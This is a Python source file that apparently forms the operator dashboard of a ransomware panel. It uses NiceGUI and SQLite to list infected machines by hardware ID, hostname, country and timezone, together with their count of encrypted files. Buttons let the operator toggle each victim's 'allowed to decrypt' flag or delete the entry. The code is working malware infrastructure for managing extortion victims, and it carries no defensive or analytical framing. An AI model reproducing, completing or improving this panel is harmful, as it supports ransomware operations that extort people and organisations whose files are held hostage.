import os
import shutil
import logging

import aiosqlite
from nicegui import ui

columns = [
    # fmt: off
    {"name": "id", "label": "ID", "field": "id", "required": True, "sortable": True},
    {"name": "hwid", "label": "HWID", "field": "hwid", "required": True, "sortable": True},
    {"name": "country_code", "label": "Country Code", "field": "country_code", "required": True, "sortable": True},
    {"name": "hostname", "label": "Hostname", "field": "hostname", "required": True, "sortable": True},
    {"name": "date", "label": "Date", "field": "date", "required": True, "sortable": True},
    {"name": "timezone", "label": "Timezone", "field": "timezone", "required": True, "sortable": True},
    {"name": "files_encrypted", "label": "Files Encrypted", "field": "files_encrypted", "required": True, "sortable": True},
    {"name": "allowed_to_decrypt", "label": "Allowed To Decrypt", "field": "allowed_to_decrypt", "required": True, "sortable": True},
    # fmt: on
]


async def clients_page_stuff(db_path: str) -> None:
    data = []
    seen_entries = set()

    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute("SELECT * FROM entries")
        rows = await cursor.fetchall()
        await cursor.close()

        for row in rows:
            new_data = {
                "id": row[0],
                "hwid": row[1],
                "country_code": row[2],
                "hostname": row[3],
                "date": row[4],
                "timezone": row[5],
                "files_encrypted": row[6],
                "allowed_to_decrypt": bool(row[8]),
            }

            new_data_tuple = tuple(new_data.items())

            if new_data_tuple not in seen_entries:
                seen_entries.add(new_data_tuple)
                data.append(new_data)

    with ui.card().classes(
        "w-full h-full justify-center no-shadow border-[1px] border-gray-200 rounded-lg"
    ):
        table = ui.table(
            columns, rows=data, pagination=10, selection="single", title="Clients Page"
        ).classes("h-full w-full bordered")

        with table.add_slot("top-right"):
            with ui.input(placeholder="Search").props("type=search").bind_value(
                table, "filter"
            ).add_slot("append"):
                ui.icon("search")

        with table.add_slot("bottom-row"):
            with table.row():
                with table.cell():
                    ui.button("AllowOpen").on_click(
                        lambda: change_allowance(table.selected[0]["hwid"], db_path)
                    ).bind_visibility_from(
                        table, "selected", backward=lambda val: bool(val)
                    ).props(
                        "flat fab-mini"
                    )

                    ui.button("Remove").on_click(
                        lambda: remove_entry(table.selected[0]["hwid"], db_path)
                    ).bind_visibility_from(
                        table, "selected", backward=lambda val: bool(val)
                    ).props(
                        "flat fab-mini"
                    )


async def change_allowance(hwid: str, db_path: str) -> None:
    current_allowance = None
    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute(
            "SELECT allowed_to_decrypt FROM entries WHERE hwid = ?", (hwid,)
        )
        current_allowance = await cursor.fetchone()
        await db.execute(
            "UPDATE entries SET allowed_to_decrypt = ? WHERE hwid = ?",
            (not current_allowance[0], hwid),
        )
        await db.commit()

    ui.notify(f"Entry with HWID {hwid} allowed.")
    ui.navigate.reload()


async def remove_entry(hwid: str, db_path: str) -> None:
    async with aiosqlite.connect(db_path) as db:
        await db.execute("DELETE FROM entries WHERE hwid = ?", (hwid,))
        await db.commit()
    logging.info(f"Removed entry with HWID: {hwid}")

    ui.notify(f"Entry with HWID {hwid} removed.")
    ui.navigate.reload()
